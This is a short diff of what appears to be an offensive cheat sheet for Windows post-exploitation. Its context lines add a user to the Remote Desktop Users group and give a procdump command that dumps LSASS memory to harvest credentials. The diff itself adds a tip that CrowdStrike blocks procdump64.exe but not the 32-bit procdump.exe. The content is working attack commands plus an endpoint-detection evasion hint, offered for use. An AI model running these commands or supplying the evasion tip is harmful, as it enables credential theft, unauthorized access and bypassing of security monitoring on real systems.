@@ -50,7 +50,8 @@ net localgroup "Remote Desktop Users" *username* /add
 ```
 
 ### Procdump LSASS for creds
-This creates a memory dump using the procdump sysinternals tool. 
+This creates a memory dump using the procdump sysinternals tool.
+(Crowdstrike doesnt block procdump.exe but blocks procdump64.exe no idea why)
 #### 32bit
 `C:\temp\procdump.exe -accepteula -ma lsass.exe lsass.dmp`
 #### 64bit
